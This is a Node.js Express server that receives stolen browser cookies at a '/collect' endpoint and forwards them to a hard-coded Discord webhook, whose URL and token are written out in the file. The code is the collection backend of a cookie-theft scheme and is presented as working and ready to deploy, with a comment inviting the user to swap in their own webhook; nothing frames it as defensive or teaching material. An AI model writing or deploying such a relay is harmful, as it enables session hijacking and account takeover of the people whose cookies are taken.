const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.post('/collect', async (req, res) => {
    const { cookies } = req.body;
    const webhookUrl = 'https://discord.com/api/webhooks/1437743025953439835/gZrc-9cXzuYPErOQrDlc_loo_eMGS_dhnpKHVcz59G9QU-loKC_HsLKTb3gfKge4BEDI'; // Replace with your Discord webhook URL

    const message = {
        content: `New cookies received:\n\`\`\`\n${cookies}\n\`\`\``
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });
        res.send('Cookies sent to Discord!');
    } catch (error) {
        console.error('Error sending message to Discord:', error);
        res.status(500).send('Failed to send cookies to Discord.');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
